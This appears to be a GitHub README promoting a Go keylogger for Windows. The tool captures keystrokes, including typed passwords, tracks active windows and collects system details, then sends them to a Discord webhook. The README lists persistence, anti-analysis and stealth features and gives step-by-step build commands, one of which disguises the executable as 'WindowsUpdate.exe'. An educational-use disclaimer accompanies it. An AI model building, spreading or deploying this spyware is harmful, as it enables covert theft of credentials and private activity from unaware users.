
<h1><div align="center">🔍 Disco Keylogger 🚀🔮</div></h1>
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█░▒▓[ 𝗦𝗬𝗘𝗗 𝗠𝗨𝗛𝗔𝗠𝗠𝗔𝗗 𝗞𝗛𝗨𝗕𝗔𝗜𝗕 𝗦𝗛𝗔𝗛 ]█░▒▓█░▒▓█░▒▓█░▒▓█░▒▓█░▒▓
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

# Advanced Discord-Integrated Keylogger for Educational Cybersecurity Research • Windows System Monitoring & Analytics

A sophisticated Discord-integrated keylogger written in Go, designed for cybersecurity education and authorized penetration testing. Captures keystrokes, monitors active windows, and delivers real-time analytics through Discord webhooks.

![GO](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)
![Windows 10](https://img.shields.io/badge/Windows-10%7C11-0078D6?style=for-the-badge&logo=windows)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Discord](https://img.shields.io/badge/Discord-Webhook-5865F2?style=for-the-badge&logo=discord)

## 📊 Features Overview
**🎹 Keystroke Capture**
- All keyboard keys including function keys
- Proper case handling (Shift + CapsLock)
- Special keys: Ctrl, Alt, Win, etc.
- Real-time delivery to Discord

**🖼️ Window Monitoring**
- Active application tracking
- Window focus change detection
- Timestamped activity logs

**🛡️ System Integration**
- Startup persistence (Registry + Startup folder)
- Anti-analysis protections
- Stealth operation mode
- System information collection

**📱 Discord Integration**
- Rich embed messages
- Organized data presentation
- Real-time notifications
- System analytics dashboard

## 🔍 What Gets Captured
```
🖥️ System Session Started
👤 Username: JohnDoe        💻 Computer: DESKTOP-ABC123
🏠 Hostname: workstation    ⚙️ Architecture: windows/amd64  
🔢 CPU Cores: 8             📁 Directory: C:\Users\JohnDoe
```
**Keystroke Examples**
```
⌨️ Keystroke Capture
Window: Notepad
Hello World! This is a test[ENTER]
My password is: Test123![ENTER]
```
**Window Activity**
```
🔄 Window Focus Changed
Previous: Notepad
Current: Google Chrome
```

## 🚀 Quick Start
- **Prerequisites Checklist**
  - Windows 10/11 Operating System
  - Go 1.21+ installed
  - Discord Webhook URL configured
  - Administrator Access (recommended)

## 📥 Installation Guide
**Step 1: Install Go Programming Language**
- Download from official website:
```bash
https://golang.org/dl/
```
- Download Windows installer (e.g., go1.21.4.windows-amd64.msi)
- Run installer and follow setup instructions

- **Verify installation**:
- cmd
```
go version
```
- Expected output: go version go1.21.4 windows/amd64

**Step 2: Clone Repository**
```
git clone https://github.com/dearvirussir/Disco-Keylogger.git
cd Disco-Keylogger
```
**Step 3: Download Dependencies**
```
go mod download
go mod tidy
```
**Step 4: Configure Discord Webhook**
 **Create Discord Webhook:**
  1. Go to your Discord server
  2. Server Settings → Integrations → Webhooks
  3. Create New Webhook
  4. Copy webhook URL

**Update Configuration in `main.go`**
```
// Line 18 - Replace with your webhook URL
const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
```

## 🔧 Building the Executable
**Stealth Build (Recommended)**
- Step 1:
```
go init advancedkeylogger
```
- Step 2:
```
go mod tidy
```
- Step 3:
```
go build -ldflags="-s -w -H=windowsgui" -o DiscoKeylogger.exe main.go
```


## Advanced Stealth Build
- Step 1:
```
go init advancedkeylogger
```
- Step 2:
```
go mod tidy
```
- Step 3:
```
go build -ldflags="-s -w -H=windowsgui -extldflags=-static" -o WindowsUpdate.exe main.go
```

## 🛡️ Security & Privacy
**🔒 Important Disclaimers**
```
████████████████████████████████████████████████████████████████████████████████
█                            ⚠️  WARNING  ⚠️                                   █
█                                                                              █
█  THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY!         █
█                                                                              █
█  🚫 ILLEGAL USES:                                                            █
█     • Unauthorized system monitoring                                         █
█     • Privacy violations                                                     █
█     • Malicious activities                                                   █
█                                                                              █
█  ✅ AUTHORIZED USES:                                                          █
█     • Cybersecurity education                                                █
█     • Authorized penetration testing                                         █
█     • Personal systems you own                                               █
█     • Academic research                                                      █
█                                                                              █
████████████████████████████████████████████████████████████████████████████████
```
<div align="center">
🔐 Use Responsibly • 🎓 Learn Continuously • 🛡️ Protect Digital Rights
Disco Keylogger - For Educational Cybersecurity Research

⭐ Star this repo if you find it educational!

</div>

<div align="center">

[![Cyber Email](https://img.shields.io/badge/📧_CYBER_MAIL-dear.virus.420%40gmail.com-ff00ff?style=for-the-badge&logo=gmail&logoColor=white&labelColor=black)](mailto:dear.virus.420@gmail.com)
[![Ghost Telegram](https://img.shields.io/badge/📡_GHOST_PROTOCOL-%40dear__virus-00ffff?style=for-the-badge&logo=telegram&logoColor=white&labelColor=black)](https://t.me/dear_virus)  
[![Secure Call](https://img.shields.io/badge/📞_ENCRYPTED_CALL-%2B92%20709%20213915-00ff00?style=for-the-badge&logo=whatsapp&logoColor=black&labelColor=black)](tel:+92709213915)
[![GitHub](https://img.shields.io/badge/💾_SOURCE_CODE-000000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dear-virus)  
[![Portfolio](https://img.shields.io/badge/🔗_NETWORK_PROFILE-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white&labelColor=black)](https://deavirus.netlify.app)


![Matrix Animation](https://media.giphy.com/media/12zV7u6Bh0vHpu/giphy.gif)
